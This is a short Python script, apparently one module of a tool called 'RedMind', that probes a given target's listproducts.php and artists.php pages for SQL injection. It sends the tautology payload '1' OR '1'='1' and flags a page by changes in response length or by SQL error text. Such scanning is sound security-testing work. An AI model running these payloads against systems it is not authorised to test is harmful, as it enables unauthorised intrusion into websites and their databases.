#!/usr/bin/env python3
import argparse, requests, json, sys
from urllib.parse import urljoin

def run(target):
    session = requests.Session()
    session.headers["User-Agent"]="RedMind-SQLi-Checker/1.0"
    paths = ["/listproducts.php", "/artists.php"]
    payloads = [({"cat":"1"},{"cat":"1' OR '1'='1"}), ({"artist":"1"},{"artist":"1' OR '1'='1"})]
    findings=[]
    debug=[]
    for good_p, bad_p in payloads:
        for path in paths:
            url = urljoin(target, path)
            try:
                r_good = session.get(url, params=good_p, timeout=10)
                r_bad  = session.get(url, params=bad_p, timeout=10)
                lg = len(r_good.text or "")
                lb = len(r_bad.text or "")
                ld = abs(lb-lg)
                err_like = any(k in (r_bad.text or "").lower() for k in ("sql","mysql","syntax","error"))
                debug.append({"path":path,"good_status":r_good.status_code,"bad_status":r_bad.status_code,"good_len":lg,"bad_len":lb,"len_diff":ld,"err_like":err_like})
                if r_good.status_code==200 and r_bad.status_code==200 and (ld>200 or err_like):
                    findings.append({"path":path,"payload":bad_p,"len_diff":ld,"error_like":err_like})
            except Exception as e:
                debug.append({"path":path,"error":str(e)})
    return {"module":"rm_mod_002_sqli","target":target,"vulnerable":bool(findings),"findings":findings,"debug":debug}

if __name__=="__main__":
    try:
        p=argparse.ArgumentParser(); p.add_argument("--target",required=True); args=p.parse_args()
        print(json.dumps(run(args.target.rstrip("/")), indent=2))
    except Exception as e:
        print(json.dumps({"module":"rm_mod_002_sqli","error":str(e)})); sys.exit(1)
